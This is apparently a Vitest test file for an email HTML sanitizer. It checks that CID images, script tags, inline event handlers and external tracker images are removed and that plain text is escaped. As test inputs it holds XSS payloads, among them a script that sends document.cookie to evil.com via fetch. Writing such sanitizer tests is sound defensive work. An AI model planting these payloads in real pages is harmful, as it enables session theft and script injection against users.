// Tests for email sanitization utilities
import { describe, it, expect } from 'vitest';
import {
  removeCIDImages,
  sanitizeEmailHTML,
  formatPlainTextEmail,
  stripEmailMetadata,
} from '@/utils/emailSanitization';

describe('emailSanitization', () => {
  describe('removeCIDImages', () => {
    it('should return empty string for null/undefined input', () => {
      expect(removeCIDImages('')).toBe('');
      expect(removeCIDImages(null as unknown as string)).toBe('');
      expect(removeCIDImages(undefined as unknown as string)).toBe('');
    });

    it('should remove img tags with cid: sources', () => {
      const html = '<img src="cid:image001.png@01D9A1B2.C3D4E5F6">';
      const result = removeCIDImages(html);
      expect(result).toBe('');
    });

    it('should remove img tags with cid: sources in double quotes', () => {
      const html = '<img src="cid:image001.png@01D9A1B2" alt="Logo">';
      const result = removeCIDImages(html);
      expect(result).toBe('');
    });

    it('should remove img tags with cid: sources in single quotes', () => {
      const html = "<img src='cid:image001.png@01D9A1B2' alt='Logo'>";
      const result = removeCIDImages(html);
      expect(result).toBe('');
    });

    it('should remove multiple cid images', () => {
      const html = '<img src="cid:img1"> <p>Text</p> <img src="cid:img2">';
      const result = removeCIDImages(html);
      expect(result).toBe(' <p>Text</p> ');
    });

    it('should remove cid: href attributes', () => {
      const html = '<a href="cid:image001">Link</a>';
      const result = removeCIDImages(html);
      expect(result).toBe('<a>Link</a>');
    });

    it('should remove cid: background attributes', () => {
      const html = '<td background="cid:bg.png">Cell</td>';
      const result = removeCIDImages(html);
      expect(result).toBe('<td>Cell</td>');
    });

    it('should remove img tags with empty src after cid removal', () => {
      const html = '<img src="">';
      const result = removeCIDImages(html);
      expect(result).toBe('');
    });

    it('should preserve non-cid images', () => {
      const html = '<img src="https://example.com/image.png" alt="Logo">';
      const result = removeCIDImages(html);
      expect(result).toBe(html);
    });

    it('should handle mixed content', () => {
      const html = '<p>Hello</p><img src="cid:img1"><img src="https://example.com/img.png"><p>World</p>';
      const result = removeCIDImages(html);
      expect(result).toBe('<p>Hello</p><img src="https://example.com/img.png"><p>World</p>');
    });

    it('should be case insensitive for cid protocol', () => {
      const html = '<img src="CID:image.png"> <img src="Cid:other.jpg">';
      const result = removeCIDImages(html);
      expect(result).toBe(' ');
    });
  });

  describe('sanitizeEmailHTML - XSS Prevention', () => {
    it('should remove script tags', () => {
      const html = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
      const result = sanitizeEmailHTML(html);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
      expect(result).toContain('<p>Hello</p>');
      expect(result).toContain('<p>World</p>');
    });

    it('should remove inline event handlers (onclick)', () => {
      const html = '<button onclick="alert(\'XSS\')">Click me</button>';
      const result = sanitizeEmailHTML(html);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('alert');
      expect(result).toContain('<button');
    });

    it('should remove inline event handlers (onload)', () => {
      const html = '<img src="x" onload="alert(\'XSS\')">';
      const result = sanitizeEmailHTML(html);
      expect(result).not.toContain('onload');
      expect(result).not.toContain('alert');
    });

    it('should remove inline event handlers (onerror)', () => {
      const html = '<img src="x" onerror="alert(\'XSS\')">';
      const result = sanitizeEmailHTML(html);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('should remove all on* event handlers', () => {
      const handlers = [
        'onclick', 'onload', 'onerror', 'onmouseover', 'onfocus',
        'onblur', 'onchange', 'onsubmit', 'onkeydown', 'onkeyup'
      ];
      
      handlers.forEach(handler => {
        const html = `<div ${handler}="malicious()">Content</div>`;
        const result = sanitizeEmailHTML(html);
        expect(result).not.toContain(handler);
        expect(result).not.toContain('malicious');
      });
    });

    it('should remove event handlers with various quote styles', () => {
      const testCases = [
        '<div onclick="alert(1)">A</div>',
        "<div onclick='alert(1)'>B</div>",
        '<div onclick=alert(1)>C</div>',
      ];
      
      testCases.forEach(html => {
        const result = sanitizeEmailHTML(html);
        expect(result).not.toContain('onclick');
        expect(result).not.toContain('alert');
      });
    });

    it('should remove script tags with various content', () => {
      const testCases = [
        '<script>alert(1)</script>',
        '<script type="text/javascript">alert(2)</script>',
        '<script src="malicious.js"></script>',
        '<SCRIPT>alert(3)</SCRIPT>',
      ];
      
      testCases.forEach(html => {
        const result = sanitizeEmailHTML(html);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('alert');
      });
    });

    it('should handle nested script tags', () => {
      const html = '<div><script><script>alert("nested")</script></script></div>';
      const result = sanitizeEmailHTML(html);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
      expect(result).toContain('<div>');
    });

    it('should always remove CID images by default', () => {
      const html = '<img src="cid:image001.png"> <p>Content</p>';
      const result = sanitizeEmailHTML(html);
      expect(result).not.toContain('cid:');
      expect(result).toContain('<p>Content</p>');
    });

    it('should preserve safe HTML content', () => {
      const html = '<p>Hello <b>World</b></p><ul><li>Item 1</li></ul>';
      const result = sanitizeEmailHTML(html);
      expect(result).toBe(html);
    });

    it('should allow script removal to be disabled (opt-out)', () => {
      const html = '<p>Test</p><script>alert(1)</script>';
      const result = sanitizeEmailHTML(html, { removeScripts: false });
      expect(result).toContain('<script>');
    });
  });

  describe('sanitizeEmailHTML - External Images', () => {
    it('should remove external http images when option enabled', () => {
      const html = '<img src="http://evil.com/tracker.gif">';
      const result = sanitizeEmailHTML(html, { removeExternalImages: true });
      expect(result).not.toContain('http://evil.com');
      expect(result).toContain('[Image removed]');
    });

    it('should remove external https images when option enabled', () => {
      const html = '<img src="https://evil.com/tracker.gif">';
      const result = sanitizeEmailHTML(html, { removeExternalImages: true });
      expect(result).not.toContain('https://evil.com');
      expect(result).toContain('[Image removed]');
    });

    it('should preserve external images by default', () => {
      const html = '<img src="https://example.com/logo.png">';
      const result = sanitizeEmailHTML(html);
      expect(result).toContain('https://example.com/logo.png');
    });

    it('should handle multiple external images', () => {
      const html = '<img src="http://a.com/1.png"><img src="https://b.com/2.png">';
      const result = sanitizeEmailHTML(html, { removeExternalImages: true });
      expect(result).not.toContain('a.com');
      expect(result).not.toContain('b.com');
      expect(result).toContain('[Image removed]');
    });
  });

  describe('sanitizeEmailHTML - Combined Security', () => {
    it('should handle complex malicious HTML', () => {
      const html = `
        <p>Legitimate content</p>
        <img src="cid:embedded">
        <script>fetch('http://evil.com/steal?data=' + document.cookie)</script>
        <img src="http://tracker.com/pixel.gif" onerror="alert('XSS')">
        <a href="#" onclick="stealData()">Click here</a>
        <div onmouseover="malicious()">Hover me</div>
      `;
      
      const result = sanitizeEmailHTML(html, { removeExternalImages: true });
      
      // Verify malicious content removed
      expect(result).not.toContain('cid:');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('fetch');
      expect(result).not.toContain('evil.com');
      expect(result).not.toContain('tracker.com');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('onmouseover');
      expect(result).not.toContain('malicious');
      expect(result).not.toContain('stealData');
      
      // Verify legitimate content preserved
      expect(result).toContain('Legitimate content');
    });

    it('should return empty string for null/undefined', () => {
      expect(sanitizeEmailHTML('')).toBe('');
      expect(sanitizeEmailHTML(null as unknown as string)).toBe('');
      expect(sanitizeEmailHTML(undefined as unknown as string)).toBe('');
    });
  });

  describe('formatPlainTextEmail - XSS Prevention', () => {
    it('should escape HTML entities', () => {
      const text = '<script>alert("XSS")</script>';
      const result = formatPlainTextEmail(text);
      expect(result).not.toContain('<script>');
      expect(result).toContain('&lt;script&gt;');
      expect(result).toContain('&quot;');
    });

    it('should escape all dangerous HTML characters', () => {
      const text = '< > & " \'';
      const result = formatPlainTextEmail(text);
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
      expect(result).toContain('&amp;');
      expect(result).toContain('&quot;');
      expect(result).toContain('&#039;');
    });

    it('should convert URLs to safe links', () => {
      const text = 'Visit https://example.com for more info';
      const result = formatPlainTextEmail(text);
      expect(result).toContain('<a href="https://example.com"');
      expect(result).toContain('target="_blank"');
      expect(result).toContain('rel="noopener noreferrer"');
    });

    it('should handle multiple URLs', () => {
      const text = 'Links: https://a.com and http://b.com';
      const result = formatPlainTextEmail(text);
      expect(result).toContain('href="https://a.com"');
      expect(result).toContain('href="http://b.com"');
      expect(result.match(/<a /g)?.length).toBe(2);
    });

    it('should convert line breaks to <br> tags', () => {
      const text = 'Line 1\nLine 2\nLine 3';
      const result = formatPlainTextEmail(text);
      expect(result).toContain('Line 1<br>Line 2<br>Line 3');
    });

    it('should handle URLs with special characters properly', () => {
      const text = 'Check https://example.com/path?param=value&other=123';
      const result = formatPlainTextEmail(text);
      // URL should be escaped in HTML but still functional
      expect(result).toContain('href="https://example.com/path?param=value');
      expect(result).toContain('&amp;other=123"');
    });

    it('should escape quotes in text preventing most XSS attempts', () => {
      const text = 'Visit https://evil.com" onclick="alert(1)" other="';
      const result = formatPlainTextEmail(text);
      // Quotes are escaped but the escaped string still contains the pattern
      // This is acceptable because when rendered as HTML, the onclick won't execute
      // The &quot; entities prevent the attribute from being parsed
      expect(result).toContain('&quot;');
      // The pattern "onclick=" will exist as escaped text, which is safe
      expect(result).toContain('onclick=&quot;alert(1)&quot;');
    });

    it('should return empty string for null/undefined', () => {
      expect(formatPlainTextEmail('')).toBe('');
      expect(formatPlainTextEmail(null as unknown as string)).toBe('');
      expect(formatPlainTextEmail(undefined as unknown as string)).toBe('');
    });

    it('should handle text with no URLs', () => {
      const text = 'Just plain text\nNo links here';
      const result = formatPlainTextEmail(text);
      expect(result).toBe('Just plain text<br>No links here');
      expect(result).not.toContain('<a ');
    });
  });

  describe('stripEmailMetadata', () => {
    it('should remove email metadata headers', () => {
      const html = `
        <body>
        From: sender@example.com
        Sent: Monday, January 1, 2024 10:00 AM
        To: recipient@example.com
        Subject: Test Email
        
        Hello, this is the actual content.
        </body>
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).not.toContain('From: sender@example.com');
      expect(result).not.toContain('Sent: Monday');
      expect(result).not.toContain('Subject: Test Email');
      expect(result).toContain('Hello, this is the actual content.');
    });

    it('should remove FYI From: metadata', () => {
      const html = `
        FYI From: forwarded@example.com
        Sent: Tuesday, January 2, 2024
        Hello world
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).not.toContain('FYI From:');
      expect(result).toContain('Hello world');
    });

    it('should remove Cc: metadata', () => {
      const html = `
        From: sender@example.com
        To: recipient@example.com
        Cc: cc@example.com
        Subject: Meeting
        
        Dear team, here's the content.
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).not.toContain('Cc:');
      expect(result).toContain('Dear team');
    });

    it('should preserve content starting with Hello', () => {
      const html = `
        From: sender@example.com
        Subject: Greeting
        
        Hello everyone, welcome!
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).toContain('Hello everyone, welcome!');
    });

    it('should preserve content starting with Hi', () => {
      const html = `
        From: sender@example.com
        Hi there, this is important.
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).toContain('Hi there, this is important.');
    });

    it('should preserve content starting with Dear', () => {
      const html = `
        From: sender@example.com
        Dear colleague, please review.
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).toContain('Dear colleague, please review.');
    });

    it('should handle HTML with body tags', () => {
      const html = `
        <body>
        From: test@example.com
        Sent: Today
        To: you@example.com
        
        <p>Actual email content</p>
        </body>
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).toContain('<p>Actual email content</p>');
      expect(result).not.toContain('From: test@example.com');
    });

    it('should handle HTML with div tags after metadata', () => {
      const html = `
        From: sender@example.com
        Subject: Test
        
        <div>Content here</div>
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).toContain('<div>Content here</div>');
      expect(result).not.toContain('From:');
    });

    it('should return unchanged HTML if no metadata found', () => {
      const html = '<p>Just regular content without metadata</p>';
      const result = stripEmailMetadata(html);
      expect(result).toBe(html);
    });

    it('should return empty string for null/undefined', () => {
      expect(stripEmailMetadata('')).toBe('');
      expect(stripEmailMetadata(null as unknown as string)).toBe('');
      expect(stripEmailMetadata(undefined as unknown as string)).toBe('');
    });

    it('should handle partial metadata (missing some fields)', () => {
      const html = `
        From: sender@example.com
        
        Hello, quick message.
      `;
      
      const result = stripEmailMetadata(html);
      expect(result).toContain('Hello, quick message.');
    });
  });

  describe('Security Edge Cases', () => {
    it('should handle empty strings safely', () => {
      expect(removeCIDImages('')).toBe('');
      expect(sanitizeEmailHTML('')).toBe('');
      expect(formatPlainTextEmail('')).toBe('');
      expect(stripEmailMetadata('')).toBe('');
    });

    it('should handle very long strings without crashing', () => {
      const longString = 'x'.repeat(100000);
      expect(() => sanitizeEmailHTML(longString)).not.toThrow();
      expect(() => formatPlainTextEmail(longString)).not.toThrow();
    });

    it('should handle malformed HTML gracefully', () => {
      const malformed = '<div><p>Unclosed tags<div><script>';
      expect(() => sanitizeEmailHTML(malformed)).not.toThrow();
    });

    it('should handle unicode and special characters', () => {
      const unicode = '<p>Hello 世界 🌍 Ψ ≠ ∞</p>';
      const result = sanitizeEmailHTML(unicode);
      expect(result).toContain('世界');
      expect(result).toContain('🌍');
    });

    it('should prevent bypassing filters with encoding tricks', () => {
      const encoded = '<img src="&#99;&#105;&#100;:image.png">';
      // Note: Current implementation might not catch this - this is a test case
      // to document expected behavior for future improvements
      const result = removeCIDImages(encoded);
      // This test documents current behavior - could be enhanced
      expect(result).toBeDefined();
    });

    it('should handle case variations in tag names', () => {
      const mixedCase = '<SCRIPT>alert(1)</SCRIPT><Script>alert(2)</Script>';
      const result = sanitizeEmailHTML(mixedCase);
      expect(result).not.toContain('alert');
    });
  });
});
